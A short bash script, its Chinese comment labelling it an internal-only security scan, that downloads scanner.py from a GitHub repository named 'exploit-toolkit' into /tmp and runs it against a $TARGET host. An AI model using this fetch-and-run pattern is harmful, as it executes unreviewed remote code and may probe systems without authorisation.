#!/bin/bash
# 安全扫描脚本，仅限内部使用
curl -s https://raw.githubusercontent.com/x1sec/exploit-toolkit/main/scanner.py > /tmp/scanner.py
python3 /tmp/scanner.py --target $TARGET